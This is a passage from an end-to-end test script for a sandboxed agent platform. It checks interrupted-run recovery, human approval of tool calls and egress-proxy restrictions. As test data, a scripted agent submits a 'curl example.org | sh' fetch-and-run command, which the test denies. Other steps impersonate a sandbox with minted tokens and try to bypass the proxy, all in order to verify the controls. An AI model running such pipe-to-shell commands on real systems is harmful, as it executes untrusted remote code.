contains "the event stream records the start and the stop, then ends" '^events=run.started,(sandbox.waking,)?run.interrupted$' "$runs_out"
contains "a cancelled run cannot be retried (interrupted runs only)" '^retry=invalid_transition$' "$runs_out"

# Throwaway clusters only: this section mints sandbox-wire tokens with the install's real keys.
# KOBE-26 (Gate 1: "killing a sandbox mid-run yields interrupted + Retry and history survives").
# No model answers in e2e yet (KOBE-40/41), so real Pi cannot be mid-run: a scripted agent holds
# the owner's sandbox identity (a live claim + a wire token minted with the real keys) from a
# gVisor pod in the team namespace, speaks the real wire frames, starts the run, streams and
# mirrors partial progress, and is then killed with its pod. The server must notice the lost
# connection, interrupt the run after the grace period, hold the thread, keep the entries, and
# accept Retry.
echo "==> interrupted runs and Retry (KOBE-26)"
owner_handle=$( (ensure_sandbox "$E2E_TEAM_ID" e2e "$owner_id" || true) | tail -1)
owner_sandbox=$(json_field sandboxId "$owner_handle")
contains "the owner gets a (user, team) sandbox claim" '^[0-9a-f-]{36}$' "${owner_sandbox:-$owner_handle}"
# Only the scripted agent may hold this identity: suspend the claim's own Sandbox (its pod goes,
# the claim stays live), so no real agent connects in its place (not asserted).
owner_sbx=$($KUBECTL -n "$TEAM_NS" get sandboxclaim "u-$owner_id" -o jsonpath='{.status.sandbox.name}' 2>/dev/null || true)
if [[ -n "$owner_sbx" ]]; then
  $KUBECTL -n "$TEAM_NS" patch sandbox "$owner_sbx" --type merge -p '{"spec":{"operatingMode":"Suspended"}}' >/dev/null 2>&1 || true
fi
owner_token=$(mint kobe.sandbox-wire "${owner_sandbox:-none}" "$owner_id")
read -r -d '' AGENT_JS <<'JS' || true
const { default: WebSocket } = await import("/app/node_modules/ws/wrapper.mjs");
const { randomBytes } = await import("node:crypto");
const { KOBE_WIRE_URL: url, KOBE_WIRE_TOKEN: token, KOBE_SANDBOX_ID: sandboxId } = process.env;
const log = (line) => console.log(line);
const hex = () => randomBytes(4).toString("hex");
const sessions = new Map();
const seqs = new Map();
const open = () =>
  new Promise((resolve) => {
    const ws = new WebSocket(url, ["kobe.sandbox.v1"], {
      headers: { Authorization: "Bearer " + token },
      perMessageDeflate: false,
    });
    ws.once("open", () => resolve(ws));
    ws.once("unexpected-response", (_req, res) => { log("refused=" + res.statusCode); resolve(undefined); });
    ws.once("error", () => resolve(undefined));
  });
let ws;
for (let i = 0; i < 180 && !ws; i += 1) { // the CNI admits a new pod after a delay
  ws = await open();
  if (!ws) await new Promise((r) => setTimeout(r, 1000));
}
if (!ws) { log("connect=failed"); process.exit(1); }
const send = (frame) => ws.send(JSON.stringify({ v: 1, ...frame }));
const ok = (command_id, data) =>
  send({ type: "command.result", command_id, ok: true, ...(data === undefined ? {} : { data }) });
const event = (start, ev) => {
  const seq = (seqs.get(start.run_id) ?? 0) + 1;
  seqs.set(start.run_id, seq);
  send({ type: "pi.event", run_id: start.run_id, thread_id: start.thread_id, seq, event: ev });
};
const usage = { input: 1, output: 1, cacheRead: 0, cacheWrite: 0, totalTokens: 2, cost: { total: 0 } };
ws.on("close", (code) => { log("closed=" + code); process.exit(0); });
ws.on("message", (raw) => {
  const f = JSON.parse(raw.toString());
  if (f.type === "hello.ack") log("ready");
  else if (f.type === "ping") send({ type: "pong", nonce: f.nonce });
  else if (f.type === "ack") { if (f.seq >= (seqs.get(f.run_id) ?? 0)) log("acked=" + f.run_id); }
  else if (f.type === "pi.command" && f.command.type === "get_entries") {
    const s = sessions.get(f.thread_id) ?? [];
    const since = f.command.since;
    const at = since === undefined ? -1 : s.findIndex((e) => e.id === since);
    if (since !== undefined && at < 0) {
      send({ type: "command.result", command_id: f.command_id, ok: false, error: { code: "pi_rejected", message: "Entry not found" } });
    } else ok(f.command_id, { entries: s.slice(at + 1), leafId: s.at(-1)?.id ?? null });
  } else if (f.type === "run.start") {
    ok(f.command_id);
    // Like Pi: a settings entry at the root, the prompt, then a partial answer (turn_end) — and
    // no agent_settled: the run is still going when the pod dies.
    const now = new Date().toISOString();
    const s = sessions.get(f.thread_id) ?? [];
    if (s.length === 0) {
      s.push({ type: "thinking_level_change", id: hex(), parentId: null, timestamp: now, thinkingLevel: "off" });
      log("root=" + s[0].id);
    }
    const user = { type: "message", id: hex(), parentId: f.parent_entry_id ?? s.at(-1).id, timestamp: now, message: { role: "user", content: f.message } };
    const answer = { type: "message", id: hex(), parentId: user.id, timestamp: now, message: { role: "assistant", content: [{ type: "text", text: "Working on it" }] } };
    sessions.set(f.thread_id, [...s, user, answer]);
    event(f, { type: "agent_start" });
    event(f, { type: "message_start", message: { role: "assistant" } });
    for (const delta of ["Work", "ing on", " it"]) {
      event(f, { type: "message_update", usage, assistantMessageEvent: { type: "text_delta", contentIndex: 0, delta } });
    }
    event(f, { type: "message_end", message: { role: "assistant" } });
    event(f, { type: "turn_end", message: { role: "assistant" } });
    log("started=" + f.run_id);
  } else if (typeof f.command_id === "string") ok(f.command_id);
});
send({ type: "hello", sandbox_id: sandboxId, agent_version: "e2e-scripted", pi_version: "1.0.0", runs: [] });
JS
agent_script=$(printf '%s\n' "$AGENT_JS" | sed 's/^/          /')
PODS+=("-n $TEAM_NS e2e-agent")
$KUBECTL apply -f - >/dev/null <<EOF
apiVersion: v1
kind: Pod
metadata: { name: e2e-agent, namespace: $TEAM_NS }
spec:
  restartPolicy: Never
  runtimeClassName: gvisor
  automountServiceAccountToken: false
  securityContext: { runAsNonRoot: true, runAsUser: 1000, seccompProfile: { type: RuntimeDefault } }
  containers:
    - name: agent
      image: ghcr.io/splittingatom/kobe-server:$TAG
      imagePullPolicy: IfNotPresent
      securityContext: { allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: { drop: ["ALL"] } }
      resources: { requests: { cpu: 50m, memory: 64Mi }, limits: { cpu: 500m, memory: 256Mi } }
      env:
        - { name: KOBE_WIRE_URL, value: "ws://$server_ip:8081/v1/sandbox/connect" }
        - { name: KOBE_WIRE_TOKEN, value: "$owner_token" }
        - { name: KOBE_SANDBOX_ID, value: "${owner_sandbox:-none}" }
      command: ["node", "--input-type=module", "-e"]
      args:
        - |
$agent_script
EOF
agent_logs() { $KUBECTL -n "$TEAM_NS" logs e2e-agent 2>&1; }
contains "the scripted agent connects as the owner's sandbox" '^ready$' "$(wait_for 240 '^(ready|closed=.*|refused=.*|connect=failed)$' agent_logs)"
read -r -d '' API_JS <<'JS' || true
const [team, ...args] = process.argv.slice(1);
const base = "http://127.0.0.1:" + process.env.PORT;
const origin = new URL(process.env.KOBE_PUBLIC_URL).origin;
const jar = new Map();
const call = async (method, path, body) => {
  const res = await fetch(base + path, {
    method,
    headers: { origin, "content-type": "application/json", "x-kobe-team": team,
      cookie: [...jar].map(([k, v]) => k + "=" + v).join("; ") },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  for (const c of res.headers.getSetCookie()) {
    const [pair] = c.split(";");
    const at = pair.indexOf("=");
    jar.set(pair.slice(0, at), pair.slice(at + 1));
  }
  const text = await res.text();
  let json = {};
  try { json = JSON.parse(text); } catch {}
  return { status: res.status, json, text };
};
const out = (k, v) => console.log(k + "=" + v);
await call("POST", "/api/auth/sign-in/email", { email: "owner@e2e.test", password: "e2e owner password" });
await call("PUT", "/v1/me/teams/active", { teamId: team });
const entryIds = async (id) => ((await call("GET", "/v1/threads/" + id)).json.entries ?? []).map((e) => e.entry_id).join(",");
JS
read -r -d '' START_JS <<'JS' || true
const thread = await call("POST", "/v1/threads", { title: "e2e interrupted" });
out("thread", thread.json.thread_id);
const msg = await call("POST", "/v1/threads/" + thread.json.thread_id + "/messages", { content: "e2e: a long job" });
out("message", msg.status + ":" + msg.json.queued);
out("run", msg.json.run_id);
JS
api() { # script [args...] → key=value lines from the owner's API calls inside the server pod
  local script="$1"
  shift
  $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node --input-type=module -e "$API_JS
$script" "$E2E_TEAM_ID" "$@" 2>&1 | grep -E '^[a-z_]+=' || true
}
start_out=$(api "$START_JS")
i_thread=$(printf '%s\n' "$start_out" | sed -n 's/^thread=//p')
i_run=$(printf '%s\n' "$start_out" | sed -n 's/^run=//p')
contains "a message starts a run on the owner's sandbox" '^message=201:false$' "$start_out"
contains "the sandbox receives run.start and streams partial progress" "^acked=${i_run:-none}$" \
  "$(wait_for 120 "^(acked=${i_run:-none}|closed=.*)$" agent_logs)"
entries_sql="SELECT string_agg(entry_id, ',' ORDER BY seq) FROM thread_entries WHERE thread_id = '${i_thread:-00000000-0000-4000-8000-000000000000}'"
mirrored() { psql_kobe "SELECT count(*) FROM thread_entries WHERE thread_id = '${i_thread:-00000000-0000-4000-8000-000000000000}'"; }
contains "the partial answer is mirrored into thread_entries (root, prompt, answer)" '^3$' "$(wait_for 60 '^3$' mirrored)"
entries_before=$(psql_kobe "$entries_sql")
root_entry=$(agent_logs | sed -n 's/^root=//p' | head -1)
run_status() { psql_kobe "SELECT status FROM runs WHERE id = '${i_run:-00000000-0000-4000-8000-000000000000}'"; }
contains "the run is running before the kill" '^running$' "$(run_status)"
# Kill the sandbox mid-run: its pod is deleted (SIGTERM, then SIGKILL after 1 s).
killed_at=$SECONDS
$KUBECTL -n "$TEAM_NS" delete pod e2e-agent --grace-period=1 --wait=true >/dev/null 2>&1 || true
# Lost connection → 30 s grace → the next sweep (10 s, jittered) interrupts it; allow 240 s.
status_after=$(wait_for 240 '^(interrupted|completed|failed|cancelled)$' run_status)
printf '     interrupted after %ss\n' "$((SECONDS - killed_at))"
contains "killing the sandbox mid-run interrupts the run" '^interrupted$' "$status_after"
contains "the thread is interrupted (its queue is held)" '^interrupted$' \
  "$(psql_kobe "SELECT status FROM threads WHERE id = '${i_thread:-00000000-0000-4000-8000-000000000000}'")"
contains "the interruption is audited (sandbox gone)" '^sandbox_gone$' \
  "$(psql_kobe "SELECT target->>'cause' FROM audit_log WHERE action = 'run.interrupted' AND target->>'runId' = '${i_run:-none}'")"
read -r -d '' RETRY_JS <<'JS' || true
const [threadId, runId] = args;
const before = await entryIds(threadId);
const detail = await call("GET", "/v1/threads/" + threadId);
out("thread_status", detail.json.status);
const runs = await call("GET", "/v1/threads/" + threadId + "/runs");
out("interrupted_run", runs.json.interrupted_run?.run_id === runId ? "this" : JSON.stringify(runs.json.interrupted_run));
const events = await call("GET", "/v1/runs/" + runId + "/events");
out("events", (events.text.match(/^event: .*$/gm) || []).map((l) => l.slice(7)).filter((t) => t.startsWith("run.")).join(","));
out("interrupted_payload", /"reason":"sandbox_lost"/.test(events.text) && /"retryable":true/.test(events.text));
const retry = await call("POST", "/v1/runs/" + runId + "/retry");
out("retry", retry.status + ":" + retry.json.queued);
const again = await call("POST", "/v1/runs/" + runId + "/retry");
out("retry_again", again.json.run_id === retry.json.run_id ? "same" : again.status + ":" + again.json.code);
const snap = await call("GET", "/v1/runs/" + retry.json.run_id);
out("retry_run", snap.json.status + ":" + (snap.json.retry_of_run_id === runId));
out("retry_id", retry.json.run_id);
const after = await entryIds(threadId);
out("history", before !== "" && after.startsWith(before) ? "intact" : before + " -> " + after);
out("cancel_retry", (await call("POST", "/v1/runs/" + retry.json.run_id + "/cancel")).json.status);
JS
retry_out=$(api "$RETRY_JS" "${i_thread:-none}" "${i_run:-none}")
printf '     retry: %s\n' "$(printf '%s' "$retry_out" | tr '\n' ' ')"
contains "the API shows the thread interrupted" '^thread_status=interrupted$' "$retry_out"
contains "the thread's runs name the run to retry (survives a reload)" '^interrupted_run=this$' "$retry_out"
contains "the event stream ends with run.interrupted" '^events=run.started,run.interrupted$' "$retry_out"
contains "run.interrupted says sandbox_lost, retryable" '^interrupted_payload=true$' "$retry_out"
contains "Retry starts a new run at once" '^retry=201:false$' "$retry_out"
contains "Retry is once per run (a repeat returns the same retry)" '^retry_again=same$' "$retry_out"
contains "the retry run links the interrupted run" '^retry_run=running:true$' "$retry_out"
contains "history survives the kill and the retry" '^history=intact$' "$retry_out"
retry_id=$(printf '%s\n' "$retry_out" | sed -n 's/^retry_id=//p')
contains "the retry branches beside the interrupted prompt (from the root entry)" "^${root_entry:-none}$" \
  "$(psql_kobe "SELECT parent_entry_id FROM runs WHERE id = '${retry_id:-00000000-0000-4000-8000-000000000000}'")"
contains "every entry from before the kill is still in Postgres" "^${entries_before:-none}" "$(psql_kobe "$entries_sql")"
contains "the retry can still be stopped" '^cancel_retry=cancelled$' "$retry_out"

# KOBE-37: a policy rule requiring approval makes a tool call wait until its user answers through
# the API; allow lets it run, deny ends it denied. A team ask rule on bash (sandbox tools ask only
# when a rule says so); a scripted agent holding the owner's sandbox identity (as above) sends real
# policy.check frames; the owner allows the first call and denies the second over the API. The
# 1 h TTL expiry is covered by services/server/src/approvals.db.test.ts (an e2e run can't wait it).
echo "==> approvals (KOBE-37)"
psql_kobe "DELETE FROM tool_rules WHERE team_id = '$E2E_TEAM_ID' AND scope = 'team';
  INSERT INTO tool_rules (team_id, scope, effect, tool_glob, created_by)
  VALUES ('$E2E_TEAM_ID', 'team', 'ask', 'bash', '$owner_id');" >/dev/null
# Retry above woke the owner's real sandbox (KOBE-25 waker); its agent would replace the scripted
# connection (close 4003). Suspend it again and wait until its pod is gone.
owner_sbx=$($KUBECTL -n "$TEAM_NS" get sandboxclaim "u-$owner_id" -o jsonpath='{.status.sandbox.name}' 2>/dev/null || true)
if [[ -n "$owner_sbx" ]]; then
  $KUBECTL -n "$TEAM_NS" patch sandbox "$owner_sbx" --type merge -p '{"spec":{"operatingMode":"Suspended"}}' >/dev/null 2>&1 || true
fi
owner_pod_gone() { [[ -z "$($KUBECTL -n "$TEAM_NS" get pods -l "agents.x-k8s.io/claim-uid=${owner_sandbox:-none}" -o name 2>/dev/null)" ]]; }
owner_wire_closed() { [[ "$(psql_kobe "SELECT count(*) FROM sandbox_connections WHERE team_id = '$E2E_TEAM_ID' AND user_id = '$owner_id' AND closed_at IS NULL")" == 0 ]]; }
if until_ok 180 owner_pod_gone && until_ok 60 owner_wire_closed; then
  ok "the owner's real sandbox is down (only the scripted agent holds its identity)"
else
  fail "the owner's real sandbox is down (only the scripted agent holds its identity)"
fi
approver_token=$(mint kobe.sandbox-wire "${owner_sandbox:-none}" "$owner_id")
read -r -d '' APPROVER_JS <<'JS' || true
const { default: WebSocket } = await import("/app/node_modules/ws/wrapper.mjs");
const { KOBE_WIRE_URL: url, KOBE_WIRE_TOKEN: token, KOBE_SANDBOX_ID: sandboxId } = process.env;
const log = (line) => console.log(line);
const open = () =>
  new Promise((resolve) => {
    const ws = new WebSocket(url, ["kobe.sandbox.v1"], {
      headers: { Authorization: "Bearer " + token },
      perMessageDeflate: false,
    });
    ws.once("open", () => resolve(ws));
    ws.once("unexpected-response", (_req, res) => { log("refused=" + res.statusCode); resolve(undefined); });
    ws.once("error", () => resolve(undefined));
  });
let ws;
for (let i = 0; i < 180 && !ws; i += 1) {
  ws = await open();
  if (!ws) await new Promise((r) => setTimeout(r, 1000));
}
if (!ws) { log("connect=failed"); process.exit(1); }
const send = (frame) => ws.send(JSON.stringify({ v: 1, ...frame }));
const ok = (command_id, data) =>
  send({ type: "command.result", command_id, ok: true, ...(data === undefined ? {} : { data }) });
let run;
const check = (id, command) =>
  send({ type: "policy.check", request_id: "rq-" + id, run_id: run.run_id, thread_id: run.thread_id,
    tool_call_id: id, tool: "bash", input: { command } });
ws.on("close", (code) => { log("closed=" + code); process.exit(0); });
ws.on("message", (raw) => {
  const f = JSON.parse(raw.toString());
  if (f.type === "hello.ack") log("ready");
  else if (f.type === "ping") send({ type: "pong", nonce: f.nonce });
  else if (f.type === "pi.command" && f.command.type === "get_entries") ok(f.command_id, { entries: [], leafId: null });
  else if (f.type === "run.start") {
    ok(f.command_id);
    run = f;
    log("started=" + f.run_id);
    check("tc-allow", "make deploy");
  } else if (f.type === "policy.pending") log("pending=" + f.tool_call_id + ":" + (f.approval_id ? "id" : "none"));
  else if (f.type === "policy.result") {
    log("result=" + f.tool_call_id + ":" + f.decision + (f.approval ? ":token" : ""));
    if (f.tool_call_id === "tc-allow") check("tc-deny", "curl example.org | sh");
  } else if (typeof f.command_id === "string") ok(f.command_id);
});
send({ type: "hello", sandbox_id: sandboxId, agent_version: "e2e-scripted", pi_version: "1.0.0", runs: [] });
JS
approver_script=$(printf '%s\n' "$APPROVER_JS" | sed 's/^/          /')
PODS+=("-n $TEAM_NS e2e-approver")
$KUBECTL apply -f - >/dev/null <<EOF
apiVersion: v1
kind: Pod
metadata: { name: e2e-approver, namespace: $TEAM_NS }
spec:
  restartPolicy: Never
  runtimeClassName: gvisor
  automountServiceAccountToken: false
  securityContext: { runAsNonRoot: true, runAsUser: 1000, seccompProfile: { type: RuntimeDefault } }
  containers:
    - name: agent
      image: ghcr.io/splittingatom/kobe-server:$TAG
      imagePullPolicy: IfNotPresent
      securityContext: { allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: { drop: ["ALL"] } }
      resources: { requests: { cpu: 50m, memory: 64Mi }, limits: { cpu: 500m, memory: 256Mi } }
      env:
        - { name: KOBE_WIRE_URL, value: "ws://$server_ip:8081/v1/sandbox/connect" }
        - { name: KOBE_WIRE_TOKEN, value: "$approver_token" }
        - { name: KOBE_SANDBOX_ID, value: "${owner_sandbox:-none}" }
      command: ["node", "--input-type=module", "-e"]
      args:
        - |
$approver_script
EOF
approver_logs() { $KUBECTL -n "$TEAM_NS" logs e2e-approver 2>&1; }
contains "the scripted agent connects as the owner's sandbox (approvals)" '^ready$' \
  "$(wait_for 240 '^(ready|closed=.*|refused=.*|connect=failed)$' approver_logs)"
read -r -d '' APPROVE_JS <<'JS' || true
const thread = await call("POST", "/v1/threads", { title: "e2e approvals" });
const msg = await call("POST", "/v1/threads/" + thread.json.thread_id + "/messages", { content: "e2e: needs approval" });
out("message", msg.status + ":" + msg.json.queued);
const runId = msg.json.run_id;
out("run", runId);
const pendingOne = async () => {
  for (let i = 0; i < 120; i += 1) {
    const list = await call("GET", "/v1/approvals?status=pending&run_id=" + runId);
    const found = (list.json.approvals || [])[0];
    if (found) return found;
    await new Promise((r) => setTimeout(r, 1000));
  }
  return undefined;
};
const first = await pendingOne();
out("first", first ? first.tool_call_id + ":" + first.tool + ":" + first.input.command : "none");
out("waiting", (await call("GET", "/v1/runs/" + runId)).json.status);
out("allow", (await call("POST", "/v1/approvals/" + (first?.approval_id ?? "none"), { decision: "allow" })).json.status);
const second = await pendingOne();
out("second", second ? second.tool_call_id : "none");
out("deny", (await call("POST", "/v1/approvals/" + (second?.approval_id ?? "none"), { decision: "deny" })).json.status);
out("again", (await call("POST", "/v1/approvals/" + (second?.approval_id ?? "none"), { decision: "allow" })).json.code);
for (let i = 0; i < 30; i += 1) {
  if ((await call("GET", "/v1/runs/" + runId)).json.status === "running") break;
  await new Promise((r) => setTimeout(r, 500));
}
out("after", (await call("GET", "/v1/runs/" + runId)).json.status);
out("cancel", (await call("POST", "/v1/runs/" + runId + "/cancel")).json.status);
JS
approve_out=$(api "$APPROVE_JS")
printf '     approvals: %s\n' "$(printf '%s' "$approve_out" | tr '\n' ' ')"
a_run=$(printf '%s\n' "$approve_out" | sed -n 's/^run=//p')
a_run_sql="'${a_run:-00000000-0000-4000-8000-000000000000}'"
contains "a message starts a run on the owner's sandbox (approvals)" '^message=201:false$' "$approve_out"
contains "an ask rule makes bash wait for its user's approval" '^first=tc-allow:bash:make deploy$' "$approve_out"
contains "the run waits for the approval" '^waiting=waiting_approval$' "$approve_out"
contains "the sandbox is told the call is pending" '^pending=tc-allow:id$' "$(approver_logs)"
contains "the owner allows it through the API" '^allow=allowed$' "$approve_out"
contains "the allowed call runs; the signed token never reaches the sandbox" '^result=tc-allow:allow$' \
  "$(wait_for 60 '^result=tc-allow:' approver_logs)"
contains "the approval is signed server-side" '^[A-Za-z0-9_-]{43}$' \
  "$(psql_kobe "SELECT input_hmac FROM approvals WHERE run_id = $a_run_sql AND tool_call_id = 'tc-allow'")"
contains "the next call waits too" '^second=tc-deny$' "$approve_out"
contains "the owner denies it through the API" '^deny=denied$' "$approve_out"
contains "the denied call ends as denied" '^result=tc-deny:deny$' "$(wait_for 60 '^result=tc-deny:' approver_logs)"
contains "a decided approval can't be decided again" '^again=approval_resolved$' "$approve_out"
contains "the run continues after the denial" '^after=running$' "$approve_out"
contains "Stop ends the run" '^cancel=cancelled$' "$approve_out"
contains "approval events are on the run's stream" \
  '^approval.requested,approval.resolved,approval.requested,approval.resolved,policy.denied$' \
  "$(psql_kobe "SELECT string_agg(type, ',' ORDER BY seq) FROM run_events WHERE run_id = $a_run_sql AND (type LIKE 'approval.%' OR type = 'policy.denied')")"
contains "every request and decision is audited" '^approval.decided:2,approval.requested:2$' \
  "$(psql_kobe "SELECT string_agg(action || ':' || n, ',' ORDER BY action) FROM (SELECT action, count(*) AS n FROM audit_log WHERE target->>'runId' = '${a_run:-none}' AND action LIKE 'approval.%' GROUP BY action) a")"
$KUBECTL -n "$TEAM_NS" delete pod e2e-approver --grace-period=1 --wait=false >/dev/null 2>&1 || true
psql_kobe "DELETE FROM tool_rules WHERE team_id = '$E2E_TEAM_ID' AND scope = 'team' AND tool_glob = 'bash';" >/dev/null

# KOBE-38: sandboxes reach the internet only through the egress proxy (HTTPS CONNECT, SNI match),
# only to domains their team enabled within the install ceiling; never internal addresses.
echo "==> egress proxy (KOBE-38)"
UPSTREAM_HOST="upstream.$UPSTREAM_NS.svc.cluster.local"
INTERNAL_HOST="kobe-server.$NS.svc.cluster.local"
if [[ -n "${KOBE_SANDBOX_IMAGE:-}" && -n "${sandbox_pod:-}" ]]; then
  # The "internet": a TLS server (self-signed, s_server -www) behind a Service on 443. It has a
  # private ClusterIP, so the proxy may reach it only because this test allows exactly that IP.
  $KUBECTL create namespace "$UPSTREAM_NS" --dry-run=client -o yaml | $KUBECTL apply -f - >/dev/null
  $KUBECTL -n "$UPSTREAM_NS" run upstream --restart=Never --image="$KOBE_SANDBOX_IMAGE" --labels=app=upstream \
    --command -- sh -c 'cd /tmp && openssl req -x509 -newkey rsa:2048 -nodes -keyout k.pem -out c.pem -days 1 \
      -subj /CN=upstream >/dev/null 2>&1 && exec openssl s_server -quiet -accept 8443 -cert c.pem -key k.pem -www' >/dev/null
  $KUBECTL -n "$UPSTREAM_NS" expose pod upstream --port=443 --target-port=8443 --name=upstream >/dev/null
  $KUBECTL -n "$UPSTREAM_NS" wait --for=condition=Ready pod/upstream --timeout=180s >/dev/null 2>&1 || true
  wait_endpoints "$UPSTREAM_NS" upstream
  up_ip=$($KUBECTL -n "$UPSTREAM_NS" get svc upstream -o jsonpath='{.spec.clusterIP}')
  # Allow exactly that Service IP as an internal target (proxy check) and its pods (proxy policy);
  # flush the connection audit every 5 s instead of 60.
  up_rule=$(printf '[{"to":[{"namespaceSelector":{"matchLabels":{"kubernetes.io/metadata.name":"%s"}}}]}]' "$UPSTREAM_NS")
  if out=$($HELM upgrade kobe charts/kobe -n "$NS" --reuse-values --wait --timeout 5m \
      --set-json "egressProxy.allowedInternalCidrs=[\"$up_ip/32\"]" --set-json "egressProxy.networkPolicy.extraEgress=$up_rule" \
      --set egressProxy.auditFlushSeconds=5 2>&1); then ok "egress proxy reconfigured with the test upstream"
  else fail "egress proxy reconfigured with the test upstream: $out"; fi
  # The sandbox's team and user (the proxy checks active membership, D7); the KOBE-24 section
  # above created them too.
  psql_kobe "INSERT INTO users (id, name, email) VALUES ('$E2E_USER_ID', 'E2E', 'e2e-sandbox@e2e.test') ON CONFLICT DO NOTHING;
    INSERT INTO teams (id, slug, name) VALUES ('$E2E_TEAM_ID', 'e2e', 'E2E') ON CONFLICT DO NOTHING;
    INSERT INTO team_members (team_id, user_id, role) VALUES ('$E2E_TEAM_ID', '$E2E_USER_ID', 'member') ON CONFLICT DO NOTHING;" >/dev/null
  # Client: a sandbox-like pod in the team namespace (same NetworkPolicy, gVisor, the sandbox image
  # for curl/openssl, the proxy at egress-proxy.kobe.internal like real sandboxes) with an
  # egress-audience session token for this (user, team) sandbox minted with the real key. It does
  # not depend on the sandbox agent process (the agent's own bootstrap trade is KOBE-25's e2e).
  proxy_ip=$(svc_ip kobe-egress-proxy || true)
  EGRESS_CLIENT="egress-client-$RANDOM"
  PODS+=("-n $TEAM_NS $EGRESS_CLIENT")
  $KUBECTL -n "$TEAM_NS" run "$EGRESS_CLIENT" --restart=Never --image="$KOBE_SANDBOX_IMAGE" --overrides="{\"spec\":{
    \"runtimeClassName\":\"gvisor\",\"automountServiceAccountToken\":false,\"serviceAccountName\":\"kobe-sandbox\",$SEC_POD,
    \"dnsPolicy\":\"None\",\"dnsConfig\":{\"nameservers\":[\"127.0.0.1\"]},
    \"hostAliases\":[{\"ip\":\"${proxy_ip:-0.0.0.0}\",\"hostnames\":[\"egress-proxy.kobe.internal\"]}],
    \"containers\":[{\"name\":\"client\",\"image\":\"$KOBE_SANDBOX_IMAGE\",\"command\":[\"sleep\",\"3600\"],$SEC_CTR,
      \"resources\":{\"requests\":{\"cpu\":\"50m\",\"memory\":\"64Mi\"},\"limits\":{\"cpu\":\"500m\",\"memory\":\"256Mi\"}},
      \"volumeMounts\":[{\"name\":\"tmp\",\"mountPath\":\"/tmp\"}]}],
    \"volumes\":[{\"name\":\"tmp\",\"emptyDir\":{}}]}}" >/dev/null 2>&1 || true
  # Exec only into a running, ready container; on timeout show why (status, last state, logs).
  if $KUBECTL -n "$TEAM_NS" wait --for=condition=Ready "pod/$EGRESS_CLIENT" --timeout=240s >/dev/null 2>&1; then
    ok "the egress client pod (sandbox image, gVisor) is ready"
    client_ready=1
  else
    fail "the egress client pod (sandbox image, gVisor) is ready: $($KUBECTL -n "$TEAM_NS" get pod "$EGRESS_CLIENT" \
      -o jsonpath='{.status.phase} {.status.containerStatuses[0].state} {.status.containerStatuses[0].lastState}' 2>&1)"
    $KUBECTL -n "$TEAM_NS" describe pod "$EGRESS_CLIENT" 2>&1 | tail -25 || true
    $KUBECTL -n "$TEAM_NS" logs "$EGRESS_CLIENT" --previous --tail=30 2>&1 || true
    client_ready=0
  fi
  in_sandbox() { $KUBECTL -n "$TEAM_NS" exec "$EGRESS_CLIENT" -c client -- sh -c "$1" 2>&1 || true; }
  egress_token=$(mint kobe.egress-proxy)
  contains "an egress-proxy session token for the sandbox was minted" '^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$' "$egress_token"
  # → "connect=<CONNECT status> code=<origin status>" then the body; waits out a new proxy pod's
  # CNI warm-up (until the proxy answers the CONNECT at all) instead of failing on it.
  # The port is explicit: curl assumes 1080 for a proxy URL without one.
  proxy_url="http://kobe:$egress_token@egress-proxy.kobe.internal:80"
  # One answer from the proxy for this pod (any CONNECT status but 000) = positive control; it
  # also waits out a new proxy pod's CNI warm-up (receiving-side policy) before the checks.
  proxy_up=$(in_sandbox "if $(retry "curl -s -o /dev/null -m 5 -w %{http_connect} -x $proxy_url https://$UPSTREAM_HOST/ | grep -q '[1-9]'" 120); \
    then echo proxy=ANSWERS; else echo proxy=SILENT; fi")
  contains "control: the egress proxy answers the sandbox-like client" '^proxy=ANSWERS$' "$proxy_up"
  # → the body, then "connect=<CONNECT status> code=<origin status>".
  via_proxy() { # url [proxy url]
    in_sandbox "curl -sk -m 15 -x '${2:-$proxy_url}' -w '\nconnect=%{http_connect} code=%{http_code}\n' '$1' 2>/dev/null"
  }
  # Positive wait after a change hint: re-asks until the answer matches (bounded), then prints it.
  until_proxy() { # url regex [seconds]
    local out="" end=$((SECONDS + ${3:-20}))
    while :; do
      out=$(via_proxy "$1")
      if printf '%s\n' "$out" | grep -Eq "$2" || ((SECONDS >= end)); then break; fi
      sleep 1
    done
    printf '%s\n' "$out"
  }
  notify_egress() { psql_kobe "SELECT pg_notify('kobe_egress', 'ceiling'); SELECT pg_notify('kobe_egress', '$E2E_TEAM_ID');" >/dev/null; }

  if [[ "$client_ready" == 1 ]]; then
  fresh=$(via_proxy "https://$UPSTREAM_HOST/")
  contains "fresh install: a sandbox reaches nothing through the proxy (not in the ceiling)" '^connect=403 ' "$fresh"
  contains "fresh install: package registries are in the ceiling but not enabled for teams" '^connect=403 ' "$(via_proxy https://pypi.org/)"
  contains "the proxy refuses requests without the sandbox's token (407)" '^connect=407 ' "$(via_proxy "https://$UPSTREAM_HOST/" 'http://kobe:forged@egress-proxy.kobe.internal:80')"
  contains "the proxy refuses plain HTTP (HTTPS only)" '^connect=000 code=403' "$(via_proxy "http://$UPSTREAM_HOST/")"
  # Negative checks only after a positive control from the same pod: the proxy answered it above.
  if [[ "$proxy_up" == *proxy=ANSWERS* ]]; then
    direct=$(in_sandbox "curl -sk -m 8 --noproxy '*' https://$up_ip/ >/dev/null 2>&1 && echo up=REACHED || echo up=BLOCKED; \
      curl -sk -m 8 --noproxy '*' https://1.1.1.1/ >/dev/null 2>&1 && echo internet=REACHED || echo internet=BLOCKED")
  else
    direct="up=UNTESTED internet=UNTESTED (the proxy never answered this pod)"
  fi
  contains "direct egress to the upstream (bypassing the proxy) is blocked by NetworkPolicy" '^up=BLOCKED$' "$direct"
  contains "direct egress to the internet (bypassing the proxy) is blocked by NetworkPolicy" '^internet=BLOCKED$' "$direct"

  # An install admin adds the domains to the ceiling; the team admin enables them (D28).
  psql_kobe "INSERT INTO egress_domains (domain, in_ceiling) VALUES ('$UPSTREAM_HOST', true), ('$INTERNAL_HOST', true) ON CONFLICT DO NOTHING;
    INSERT INTO team_egress (team_id, domain, enabled_by) VALUES ('$E2E_TEAM_ID', '$UPSTREAM_HOST', '$E2E_USER_ID'),
      ('$E2E_TEAM_ID', '$INTERNAL_HOST', '$E2E_USER_ID') ON CONFLICT DO NOTHING;" >/dev/null
  notify_egress
  allowed=$(until_proxy "https://$UPSTREAM_HOST/" '^connect=200 ')
